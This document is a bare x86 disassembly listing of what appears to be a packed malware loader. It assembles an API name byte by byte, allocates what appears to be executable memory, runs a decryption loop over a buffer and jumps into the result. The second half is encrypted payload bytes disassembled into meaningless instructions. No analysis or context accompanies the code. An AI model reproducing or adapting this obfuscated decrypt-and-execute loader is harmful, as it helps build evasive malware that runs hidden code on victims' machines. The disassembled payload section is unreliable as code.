  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0xbe948f56
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x7733d32e
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	jmp    DWORD PTR [ebx+0x54]
  421830:	or     eax,0x2ace3f
  421835:	(bad)  
  421837:	fcom   QWORD PTR [edx+0xed1c026]
  42183d:	popf   
  42183e:	xchg   ebp,ecx
  421840:	sub    al,BYTE PTR [eax]
  421842:	(bad)  
  421844:	fcom   QWORD PTR [edx+0xe2e3f66]
  42184a:	popf   
  42184b:	aas    
  42184c:	int    0x2a
  42184e:	add    BYTE PTR [edi],cl
  421850:	cmp    eax,0x3f2692dc
  421855:	cs push cs
  421857:	popf   
  421858:	aas    
  421859:	int    0x2a
  42185b:	add    BYTE PTR [edi],cl
  42185d:	cmp    eax,0x3f2692dc
  421862:	cs push cs
  421864:	popf   
  421865:	aas    
  421866:	int    0x2a
  421868:	add    BYTE PTR [edi],cl
  42186a:	(bad)
  42186d:	xor    DWORD PTR es:[ecx],esi
  421870:	mov    ah,0x93
  421872:	aas    
  421873:	jns    0x421898
  421875:	int    0x2e
  421877:	test   ebp,ebx
  421879:	fsubp  st(3),st
  42187b:	push   ds
  42187c:	jp     0x4218e4
  42187e:	hlt    
  42187f:	dec    esp
  421880:	in     eax,dx
  421881:	pop    edx
  421882:	jb     0x4218e4
  421884:	pop    edx
  421885:	scas   al,BYTE PTR es:[edi]
  421886:	repz dec ebx
  421888:	pop    ds
  421889:	dec    ebp
  42188a:	outs   dx,DWORD PTR ds:[esi]
  42188b:	repz push ecx
  42188d:	mov    ds:0x586d205e,al
  421892:	cld    
  421893:	loopne 0x4218e8
  421895:	push   ecx
  421896:	push   cs
  421897:	addr16 repz pop ds
  42189a:	mov    DWORD PTR [ebp+0x53],esp
  42189d:	das    
  42189e:	push   eax
  42189f:	mov    bl,0xf6
  4218a1:	inc    ebx
  4218a2:	adc    DWORD PTR [ebx],esp
  4218a4:	add    edx,DWORD PTR [edi+0x2acd1b]
  4218aa:	(bad)  
  4218ac:	fcom   QWORD PTR [edx+0x57d2a621]
  4218b2:	faddp  st(7),st
  4218b4:	pop    edi
  4218b5:	and    BYTE PTR [ebx-0x9],al
  4218b8:	scas   eax,DWORD PTR es:[edi]
  4218b9:	(bad)  
  4218ba:	rcr    esi,1
  4218bc:	lods   eax,DWORD PTR ds:[esi]
  4218bd:	and    al,0x56
  4218bf:	clc    
  4218c0:	xor    eax,edi
  4218c2:	jne    0x4218bc
  4218c4:	popf   
  4218c5:	aaa    
  4218c6:	test   bh,dh
  4218c8:	push   ds
  4218c9:	xor    eax,0x350ff6ec
  4218ce:	xchg   ebp,eax
  4218cf:	dec    edi
  4218d0:	cmp    DWORD PTR ds:0x2c002455,eax
  4218d6:	adc    esp,DWORD PTR [eax+0x35799737]
  4218dc:	mov    eax,0xcdbd450a
  4218e1:	cwde   
  4218e2:	ins    BYTE PTR es:[edi],dx
  4218e3:	(bad)  
  4218e4:	mov    esp,0xccbfd704
  4218e9:	and    BYTE PTR [eax-0x9],bl
  4218ec:	scas   eax,DWORD PTR es:[edi]
  4218ed:	(bad)  
  4218ee:	rcr    esi,1
  4218f0:	lods   al,BYTE PTR ds:[esi]
  4218f1:	and    al,0x26
  4218f3:	lods   eax,DWORD PTR fs:[esi]
  4218f5:	(bad)  
  4218f6:	xchg   ebp,eax
  4218f7:	fmul   DWORD PTR [edi-0x4b956ec9]
  4218fd:	xor    eax,0x35a06b76
  421902:	(bad)
  421905:	add    eax,0x2c9ab965
  42190a:	jge    0x4218e2
  42190c:	pushf  
  42190d:	xchg   edi,eax
  42190e:	addr16 test al,0x25
  421911:	or     cl,BYTE PTR [ebp-0x3b]
  421914:	dec    esi
  421915:	cwde   
  421916:	je     0x42196e
  421918:	dec    ebp
  421919:	data16 faddp st(7),st
  42191c:	pop    edi
  42191d:	and    BYTE PTR [eax],al
  42191f:	(bad)  
  421921:	fcom   QWORD PTR [edx+0x5e2e3f26]
  421927:	fdivr  DWORD PTR [edi]
  421929:	int    0x66
  42192b:	add    DWORD PTR ds:0x4d427c3d,ecx
  421931:	jo     0x421961
  421933:	push   cs
  421934:	popf   
  421935:	aas    
  421936:	int    0x2a
  421938:	add    BYTE PTR [edi],cl
  42193a:	fstp   st(4)
  42193c:	xchg   ecx,eax
  42193d:	daa    
  42193e:	xor    al,0x2f
  421940:	add    al,0x9d
  421942:	aas    
  421943:	and    ebp,DWORD PTR [esi]
  421945:	add    BYTE PTR [edi],cl
  421947:	sbb    edx,0x2e3f2692
  42194d:	push   cs
  42194e:	mov    WORD PTR [edx+0x1f002acd],es
  421954:	cmp    eax,0x3a2692dc
  421959:	cs push cs
  42195b:	popf   
  42195c:	jle    0x42192b
  42195e:	sub    dl,BYTE PTR [eax]
  421960:	(bad)  
  421962:	fcom   QWORD PTR [eax+0xe2b3f26]
  421968:	pushf  
  421969:	aas    
  42196a:	int    0x2a
  42196c:	add    BYTE PTR [edi],cl
  42196e:	cmp    ah,bl
  421970:	xchg   ebx,eax
  421971:	es aas 
  421973:	cs push cs
  421975:	popf   
  421976:	aas    
  421977:	popf   
  421978:	add    BYTE PTR es:[edi],cl
  42197b:	cmp    esp,ebx
  42197d:	xchg   edx,eax
  42197e:	daa    
  42197f:	fld    TBYTE PTR [ebx]
  421981:	push   cs
  421982:	lahf   
  421983:	aas    
  421984:	int    0xaa
  421986:	add    BYTE PTR [edi],cl
  421988:	sub    eax,0x3f3692dc
  42198d:	cs push cs
  42198f:	popf   
  421990:	das    
  421991:	int    0x2a
  421993:	adc    BYTE PTR [edi],cl
  421995:	cmp    eax,0x3f2692dc
  42199a:	ds push cs
  42199c:	popf   
  42199d:	aas    
  42199e:	int    0x2a
  4219a0:	add    BYTE PTR [edi],cl
  4219a2:	cmp    eax,0xcb2692dc
  4219a7:	pop    ss
  4219a8:	add    bl,BYTE PTR [ebp+0x2ace56]
  4219ae:	bswap  ebp
  4219b0:	xlat   BYTE PTR ds:[ebx]
  4219b1:	xchg   edx,eax
  4219b2:	imul   esi,DWORD PTR [esi+0x2e],0xcd3f9d0e
  4219b9:	sub    al,BYTE PTR [eax]
  4219bb:	(bad)  
  4219bd:	fcom   QWORD PTR [edx+0xe2e3f26]
  4219c3:	popf   
  4219c4:	aas    
  4219c5:	int    0x2a
  4219c7:	add    BYTE PTR [edi],cl
  4219c9:	cmp    eax,0x3f2692dc
  4219ce:	cs push cs
  4219d0:	popf   
  4219d1:	aas    
  4219d2:	int    0x2a
  4219d4:	add    BYTE PTR [edi],cl
  4219d6:	cmp    eax,0x3f2692dc
  4219db:	cs push cs
  4219dd:	popf   
  4219de:	aas    
  4219df:	int    0x2a
  4219e1:	add    BYTE PTR [edi],cl
  4219e3:	cmp    eax,0x3f2692dc
  4219e8:	cs push cs
  4219ea:	popf   
  4219eb:	aas    
  4219ec:	int    0x2a
  4219ee:	add    BYTE PTR [edi],cl
  4219f0:	cmp    eax,0x3f2692dc
  4219f5:	cs push cs
  4219f7:	popf   
  4219f8:	aas    
  4219f9:	int    0x2a
  4219fb:	add    BYTE PTR [edi],cl
  4219fd:	cmp    eax,0x3f2692dc
  421a02:	cs push cs
  421a04:	popf   
  421a05:	aas    
  421a06:	int    0x2a
  421a08:	add    BYTE PTR [edi],cl
  421a0a:	cmp    eax,0x3f2692dc
  421a0f:	cs push cs
  421a11:	popf   
  421a12:	aas    
  421a13:	int    0x2a
  421a15:	add    BYTE PTR [edi],cl
  421a17:	cmp    eax,0x3f2692dc
  421a1c:	cs push cs
  421a1e:	mov    bl,0x4b
  421a20:	test   al,0x52
  421a22:	je     0x421a33
  421a24:	cmp    eax,0x34c692dc
  421a29:	cs push cs
  421a2b:	lea    edi,[edi]
  421a2d:	int    0x2a
  421a2f:	aam    0xb
  421a31:	cmp    eax,0x3f2696dc
  421a36:	jle    0x421a83
  421a38:	fimul  WORD PTR ds:0xf006599
  421a3e:	cmp    eax,0x1f2692dc
  421a43:	cs push cs
  421a45:	jge    0x421a58
  421a47:	mov    edi,0x3d6c7259
  421a4c:	fcom   QWORD PTR [edx+0xe2e5f26]
  421a52:	popf   
  421a53:	iret   
  421a54:	(bad)  
  421a55:	sub    al,BYTE PTR [eax]
  421a57:	push   ebp
  421a58:	cmp    eax,0x3bfe92dc
  421a5d:	cs push cs
  421a5f:	popf   
  421a60:	aas    
  421a61:	int    0x2a
  421a63:	add    BYTE PTR [edi],cl
  421a65:	cmp    eax,0x3f2692dc
  421a6a:	push   cs
  421a6b:	push   cs
  421a6c:	popf   
  421a6d:	(bad)  
  421a6f:	sub    al,BYTE PTR [eax]
  421a71:	(bad)  
  421a73:	fcom   QWORD PTR [edx+0xe2e3f26]
  421a79:	popf   
  421a7a:	aas    
  421a7b:	int    0x2a
  421a7d:	add    BYTE PTR [edi],cl
  421a7f:	cmp    eax,0x3f2692dc
  421a84:	cs push cs
  421a86:	popf   
  421a87:	aas    
  421a88:	int    0x2a
  421a8a:	add    BYTE PTR [edi],cl
  421a8c:	cmp    eax,0x3f2692dc
  421a91:	cs push cs
  421a93:	popf   
  421a94:	aas    
  421a95:	int    0x2a
  421a97:	add    BYTE PTR [edi],cl
  421a99:	cmp    eax,0x3f2692dc
  421a9e:	cs push cs
  421aa0:	popf   
  421aa1:	aas    
  421aa2:	int    0x2a
  421aa4:	add    BYTE PTR [edi],cl
  421aa6:	cmp    eax,0x3f2692dc
  421aab:	cs push cs
  421aad:	popf   
  421aae:	aas    
  421aaf:	int    0x2a
  421ab1:	add    BYTE PTR [edi],cl
  421ab3:	cmp    eax,0x3f2692dc
  421ab8:	cs push cs
  421aba:	popf   
  421abb:	aas    
  421abc:	int    0x2a
  421abe:	add    BYTE PTR [edi],cl
  421ac0:	cmp    eax,0x3f2692dc
  421ac5:	cs push cs
  421ac7:	popf   
  421ac8:	aas    
  421ac9:	int    0x2a
  421acb:	add    BYTE PTR [edi],cl
  421acd:	cmp    eax,0x3f2692dc
  421ad2:	cs push cs
  421ad4:	popf   
  421ad5:	aas    
  421ad6:	int    0x2a
  421ad8:	add    BYTE PTR [edi],cl
  421ada:	cmp    eax,0x3f2692dc
  421adf:	cs push cs
  421ae1:	popf   
  421ae2:	aas    
  421ae3:	int    0x2a
  421ae5:	add    BYTE PTR [edi],cl
  421ae7:	cmp    eax,0x3f2692dc
  421aec:	cs push cs
  421aee:	popf   
  421aef:	aas    
  421af0:	int    0x2a
  421af2:	add    BYTE PTR [edi],cl
  421af4:	cmp    eax,0x3f2692dc
  421af9:	cs push cs
  421afb:	popf   
  421afc:	aas    
  421afd:	int    0x2a
  421aff:	add    BYTE PTR [edi],cl
  421b01:	cmp    eax,0x3f2692dc
  421b06:	cs push cs
  421b08:	popf   
  421b09:	aas    
  421b0a:	int    0x2a
  421b0c:	add    BYTE PTR [edi],cl
  421b0e:	cmp    eax,0x3f2692dc
  421b13:	cs push cs
  421b15:	popf   
  421b16:	aas    
  421b17:	int    0x2a
  421b19:	add    BYTE PTR [edi],cl
  421b1b:	cmp    eax,0x3f2692dc
  421b20:	cs push cs
  421b22:	popf   
  421b23:	aas    
  421b24:	int    0x2a
  421b26:	add    BYTE PTR [edi],cl
  421b28:	cmp    eax,0x3f2692dc
  421b2d:	cs push cs
  421b2f:	popf   
  421b30:	aas    
  421b31:	int    0x2a
  421b33:	add    BYTE PTR [edi],cl
  421b35:	cmp    eax,0x3f2692dc
  421b3a:	cs push cs
  421b3c:	popf   
  421b3d:	aas    
  421b3e:	int    0x2a
  421b40:	add    BYTE PTR [edi],cl
  421b42:	cmp    eax,0x3f2692dc
  421b47:	cs push cs
  421b49:	popf   
  421b4a:	aas    
  421b4b:	int    0x2a
  421b4d:	add    BYTE PTR [edi],cl
  421b4f:	cmp    eax,0x3f2692dc
  421b54:	cs push cs
  421b56:	popf   
  421b57:	aas    
  421b58:	int    0x2a
  421b5a:	add    BYTE PTR [edi],cl
  421b5c:	cmp    eax,0x3f2692dc
  421b61:	cs push cs
  421b63:	popf   
  421b64:	aas    
  421b65:	int    0x2a
  421b67:	add    BYTE PTR [edi],cl
  421b69:	cmp    eax,0x3f2692dc
  421b6e:	cs push cs
  421b70:	popf   
  421b71:	aas    
  421b72:	int    0x2a
  421b74:	add    BYTE PTR [edi],cl
  421b76:	cmp    eax,0x3f2692dc
  421b7b:	cs push cs
  421b7d:	popf   
  421b7e:	aas    
  421b7f:	int    0x2a
  421b81:	add    BYTE PTR [edi],cl
  421b83:	cmp    eax,0x3f2692dc
  421b88:	cs push cs
  421b8a:	popf   
  421b8b:	aas    
  421b8c:	int    0x2a
  421b8e:	add    BYTE PTR [edi],cl
  421b90:	cmp    eax,0x3f2692dc
  421b95:	cs push cs
  421b97:	popf   
  421b98:	aas    
  421b99:	int    0x2a
  421b9b:	add    BYTE PTR [edi],cl
  421b9d:	cmp    eax,0x3f2692dc
  421ba2:	cs push cs
  421ba4:	popf   
  421ba5:	aas    
  421ba6:	int    0x2a
  421ba8:	add    BYTE PTR [edi],cl
  421baa:	cmp    eax,0x3f2692dc
  421baf:	cs push cs
  421bb1:	popf   
  421bb2:	aas    
  421bb3:	int    0x2a
  421bb5:	add    BYTE PTR [edi],cl
  421bb7:	cmp    eax,0x3f2692dc
  421bbc:	cs push cs
  421bbe:	popf   
  421bbf:	aas    
  421bc0:	int    0x2a
  421bc2:	add    BYTE PTR [edi],cl
  421bc4:	cmp    eax,0x3f2692dc
  421bc9:	cs push cs
  421bcb:	popf   
  421bcc:	aas    
  421bcd:	int    0x2a
  421bcf:	add    BYTE PTR [edi],cl
  421bd1:	cmp    eax,0x3f2692dc
  421bd6:	cs push cs
  421bd8:	popf   
  421bd9:	aas    
  421bda:	int    0x2a
  421bdc:	add    BYTE PTR [edi],cl
  421bde:	cmp    eax,0x3f2692dc
  421be3:	cs push cs
  421be5:	popf   
  421be6:	aas    
  421be7:	int    0x2a
  421be9:	add    BYTE PTR [edi],cl
  421beb:	cmp    eax,0x3f2692dc
  421bf0:	cs push cs
  421bf2:	popf   
  421bf3:	aas    
  421bf4:	int    0x2a
  421bf6:	add    BYTE PTR [edi],cl
  421bf8:	cmp    eax,0x3f2692dc
  421bfd:	cs push cs
  421bff:	popf   
  421c00:	aas    
  421c01:	int    0x2a
  421c03:	add    BYTE PTR [edi],cl
  421c05:	cmp    eax,0x3f2692dc
  421c0a:	cs push cs
  421c0c:	popf   
  421c0d:	aas    
  421c0e:	int    0x2a
  421c10:	add    BYTE PTR [edi],cl
  421c12:	cmp    eax,0x3f2692dc
  421c17:	cs push cs
  421c19:	popf   
  421c1a:	aas    
  421c1b:	int    0x2a
  421c1d:	add    BYTE PTR [edi],cl
  421c1f:	cmp    eax,0x3f2692dc
  421c24:	cs push cs
  421c26:	popf   
  421c27:	aas    
  421c28:	int    0x2a
  421c2a:	add    BYTE PTR [edi],cl
  421c2c:	cmp    eax,0x348efddc
  421c31:	and    DWORD PTR cs:[ebp+0x2add3f],ebx
  421c38:	and    eax,0x40e3069f
  421c3d:	rol    BYTE PTR [ebx],0x90
  421c40:	sbb    ch,BYTE PTR [edi+0x20]
  421c43:	sbb    al,0xe8
  421c45:	sbb    al,0x89
  421c47:	dec    ecx
  421c48:	hlt    
  421c49:	push   edi
  421c4a:	mov    ebx,0x882c1d74
  421c4f:	fild   DWORD PTR [edi-0x1c]
  421c52:	test   DWORD PTR [edx+ebx*1+0x11af44bc],edi
  421c59:	aaa    
  421c5a:	scas   al,BYTE PTR es:[edi]
  421c5b:	jo     0x421cd9
  421c5d:	cmp    eax,0x7b1a0f22
  421c62:	sbb    dh,BYTE PTR [ebx+0x6e]
  421c65:	inc    ebx
  421c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c67:	scas   eax,DWORD PTR es:[edi]
  421c68:	add    dl,BYTE PTR [eax]
  421c6a:	ds mov cl,0x6f
  421c6d:	xor    al,BYTE PTR [edx]
  421c6f:	mov    dh,0x9d
  421c71:	jae    0x421c70
  421c73:	retf   
  421c74:	mov    dl,0xc7
  421c76:	push   ebx
  421c77:	and    bh,ch
  421c79:	imul   ebx,DWORD PTR ds:0x95d79d7f,0x3
  421c80:	dec    ebx
  421c81:	in     eax,0x79
  421c83:	pushf  
  421c84:	imul   ecx,esi,0xeff57bbe
  421c8a:	mov    ebx,0x9aec74be
  421c8f:	mov    ecx,DWORD PTR [edi+0x19]
  421c92:	imul   ebp,ebx,0x1c
  421c95:	sub    al,0xf3
  421c97:	lods   eax,DWORD PTR ds:[esi]
  421c98:	pop    edi
  421c99:	mov    BYTE PTR [edx],bl
  421c9b:	mov    cl,0xd8
  421c9d:	data16 add cl,BYTE PTR [ebx-0x18]
  421ca1:	add    bh,BYTE PTR [ecx+ecx*4+0x79]
  421ca5:	lea    edx,[eax+ecx*2+0x68e44421]
  421cac:	cs lock or al,0xed
  421cb0:	pop    esi
  421cb1:	xchg   ecx,eax
  421cb2:	xor    BYTE PTR [eax-0x54],al
  421cb5:	ret    
  421cb6:	and    al,0x20
  421cb9:	inc    ebp
  421cba:	retf   
  421cbb:	test   al,0x95
  421cbd:	sbb    eax,0x7a3d5b15
  421cc2:	sbb    dl,BYTE PTR [edi]
  421cc4:	(bad)  
  421cc5:	jbe    0x421c4d
  421cc7:	mov    dl,0x10
  421cc9:	cs cwde 
  421ccb:	stos   BYTE PTR es:[edi],al
  421ccc:	outs   dx,BYTE PTR ds:[esi]
  421ccd:	ss mov ebp,0xda87909b
  421cd3:	sbb    al,BYTE PTR [esi+0xa8a937d]
  421cd9:	mov    esp,eax
  421cdb:	mov    dh,0xe7
  421cdd:	adc    ebx,DWORD PTR [ebx-0x25]
  421ce0:	(bad)  
  421ce1:	gs or  eax,0x4a21b8c9
  421ce7:	inc    ebp
  421ce8:	cld    
  421ce9:	sub    eax,0xcbe95f01
  421cee:	repz xor al,0xc2
  421cf1:	adc    ah,ah
  421cf3:	loop   0x421c8f
  421cf5:	sub    eax,0xfb129072
  421cfa:	(bad)  
  421cfb:	daa    
  421cfc:	imul   edx,DWORD PTR [edx],0x4e
  421cff:	mov    dl,0x28
  421d01:	push   esp
  421d02:	xor    ebp,DWORD PTR [ebx+0x31]
  421d05:	mov    bl,dh
  421d07:	mov    al,ds:0x2f71b61c
  421d0c:	mov    cl,0xb7
  421d0e:	sub    eax,0xb5c87553
  421d13:	cmp    BYTE PTR [ebp+ebx*1-0x25],cl
  421d17:	and    bh,BYTE PTR [ebp+0x76]
  421d1a:	iret   
  421d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d1c:	jg     0x421d94
  421d1e:	cs cmp esi,esi
  421d21:	loope  0x421d52
  421d23:	pop    edi
  421d24:	add    BYTE PTR [ebx-0x189bbdfe],cl
  421d2a:	mov    eax,ds:0x331115bc
  421d2f:	pop    esp
  421d30:	mov    ebx,0x9bd145b0
  421d35:	call   0x9ee3:0x86213788
  421d3c:	dec    esi
  421d3d:	std    
  421d3e:	cli    
  421d3f:	pop    esp
  421d40:	or     DWORD PTR [esi+0x6539708d],0x130fd65d
  421d4a:	mov    ds,edi
  421d4c:	scas   al,BYTE PTR es:[edi]
  421d4d:	mov    edi,0x43b6343
  421d52:	aas    
  421d53:	sbb    DWORD PTR [ebx],ebp
  421d55:	imul   edx,DWORD PTR [edx+ebp*8+0x2d],0x54ba2905
  421d5d:	retf   0xe5c
  421d60:	mov    al,ss:0xad7c8ac6
  421d66:	jne    0x421d70
  421d68:	in     eax,0x69
  421d6a:	jmp    FWORD PTR [esi+eax*8]
  421d6d:	ins    BYTE PTR es:[edi],dx
  421d6e:	cmp    ecx,esi
